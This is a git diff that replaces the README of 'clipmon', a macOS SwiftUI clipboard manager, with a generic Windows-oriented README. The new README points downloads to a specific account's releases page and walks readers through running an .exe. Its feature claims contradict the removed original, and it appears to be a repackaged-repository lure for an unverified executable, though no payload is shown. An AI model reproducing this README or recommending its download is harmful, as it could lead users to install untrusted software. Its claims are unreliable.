@@ -1,85 +1,83 @@
-<img width="125" height="125" alt="appstore" src="https://github.com/user-attachments/assets/bd3139d1-d6ae-49c9-887f-32b9842d438f" />
+# 📋 clipmon - Manage your clipboard history with ease
 
-# clipmon
+[![](https://img.shields.io/badge/Download-Clipmon-blue.svg)](https://github.com/assalamaph2703/clipmon/releases)
 
-Clipboard mega-manager for Mac (stable), Windows and Linux that can sync with Android and iOS
+clipmon acts as a central hub for your clipboard. It stores every text snippet and image you copy. You can search these items, organize them, and send them to your phone or tablet. It runs on Windows, Mac, and Linux.
 
-Built for pros (developers, writers, designers… basically anyone), this app gives you a fast, searchable history with rich previews, Markdown support, and a clean macOS menu bar experience.
+## 📥 How to download the app
 
-Most clipboard managers feel like a dump of text. This one treats your clipboard like a workspace.
+1. Open the [release page](https://github.com/assalamaph2703/clipmon/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file that ends in .exe for Windows.
+4. Save the file to your computer.
 
-- Understands what you copy  
-- Shows previews, not just raw data  
-- Fast, keyboard-first workflow  
-- Lives quietly in your macOS menu bar  
+## ⚙️ Installation steps
 
-## Screenshots
-<img width="380" height="403" alt="Screenshot 2026-05-03 at 12 21 34 AM" src="https://github.com/user-attachments/assets/1534e69a-3342-478f-abef-d97a7aeb97e5" />
-<!-- <img width="596" height="461" alt="Screenshot 2026-05-03 at 12 21 25 AM" src="https://github.com/user-attachments/assets/44c7c262-bb3e-4381-b07e-33656030f322" /> -->
+After you download the installation file, follow these steps to set up the software.
 
+1. Double-click the downloaded file in your downloads folder.
+2. Follow the on-screen instructions.
+3. Choose a folder for the installation or keep the default settings.
+4. Click finish.
+5. Open clipmon from your start menu.
 
-## Features
+The app icon appears in your system tray once it runs. You can find this icon near the clock on your taskbar.
 
-### Smart Clipboard History
-- Automatically saves everything you copy  
-- Search instantly (even across large histories)  
-- Pin important items so they don’t get lost  
+## 🧠 Core features
 
-### Rich Text & Markdown Support
-- Keeps formatting from apps like browsers, docs, and editors  
-- Native Markdown rendering  
-- Switch between raw and rendered views  
+clipmon organizes your copy and paste habits. It saves time by tracking your history automatically.
 
-### File & Content Previews
-- Images, links, and files show visual previews  
-- No more guessing what image.png or a random URL contains  
-- Quick glance = faster decisions  
+*   **Unlimited History:** The app saves every item you copy. You never lose a link or a code snippet again.
+*   **Cross-Device Sync:** Connect your Android or iOS device to sync text across your phone and computer.
+*   **Fast Search:** Press a shortcut to open the search bar. Type a keyword to find past clips.
+*   **Privacy First:** You control the data. Clear your history whenever you want.
+*   **Smart Categorization:** The app detects links, images, and text. It sorts them into tabs.
 
-### Lightning-Fast Search
-Fuzzy search across:
+## 📱 Sync with mobile devices
 
-- Text  
-- Markdown  
-- Files  
+You can send data from your PC to your phone. 
 
-Results update instantly as you type  
+1. Install the mobile companion app from your app store.
+2. Open the settings menu in the Windows app.
+3. Look for the device pairing section.
+4. Scan the QR code on your screen using the mobile app.
+5. Watch your clips appear on your phone shortly after.
 
-### macOS Menu Bar App
-- Always accessible, never intrusive  
-- Clean UI  
-- Keyboard shortcut to open instantly  
+## 🛠 Basic settings
 
-### Pin & Organize
-- Pin frequently used snippets  
-- Keep your clipboard clutter-free  
+You can change how the app behaves in the settings menu. Right-click the clipmon icon in your taskbar to open this menu.
 
-## Installation
-download the latest release from the Releases page.
+*   **Start with Windows:** Set this to yes if you want the app to run when you turn on your PC.
+*   **Shortcuts:** Change the hotkey used to open the search bar. The default is Ctrl + Shift + V.
+*   **Storage Limit:** Choose how many items the app saves. A larger limit saves more history but uses more disk space.
+*   **Ignore Apps:** Prevent the app from recording sensitive data from password managers or banking websites.
 
-## Use Cases
-- Copy code snippets and reuse them instantly  
-- Store links with previews instead of messy lists  
-- Keep formatted text without losing styling  
-- Quickly switch between recent clipboard items  
-- Build a personal knowledge scratchpad  
+## 🔍 Frequently asked questions
 
-## Tech Stack
-- SwiftUI and Swift  
-- Native macOS integrations  
-- Markdown rendering engine  
+**Does the app record my passwords?**
+No. You can add specific applications to an ignore list in the settings. This prevents clipmon from saving text copied from those apps.
 
-## Contributing
-Contributions are welcome — whether it's fixing bugs, improving UI, or suggesting features.
+**How much memory does this app use?**
+The app runs in the background with minimal impact on your system. It is designed to be lean and avoids slowing down your computer.
 
-- Fork the repo  
-- Create a feature branch  
-- Submit a PR  
+**Can I delete specific clips?**
+Yes. Open the search window. Hover your mouse over the item you want to remove. Click the small trash icon that appears next to it.
 
-## Philosophy
-Clipboard history shouldn’t feel like a trash bin.
+**Does it work without an internet connection?**
+Yes. All your history stays local on your computer. You only need the internet if you want to sync data to a mobile device.
 
-It should feel like:
+**Can I search for images?**
+Yes. The app saves images as well as text. You can drag and drop these images into other windows or documents.
 
-- a memory  
-- a tool  
-- an extension of how you think and work  
+## 💡 Usage tips
+
+*   **Pin clips:** Pin your most used snippets to the top of the list. These will stay there after you clear your history.
+*   **Search filters:** Use #text or #image in the search bar to filter your results.
+*   **Select multiple:** Hold the Ctrl key to select several items at once for deleting or copying.
+*   **Export data:** You can export your history to a file if you choose to wipe your data. This is useful for backups.
+
+## 🐞 Support
+
+If the app fails to open, restart your computer. If the problem persists, visit the issues tab on the repository. Provide a description of what happens and mention you are using the Windows version.
+
+This project relies on contributions from the community. You can suggest new features or report issues through the GitHub page. Ensure you always use the latest version to get the best performance and security updates.
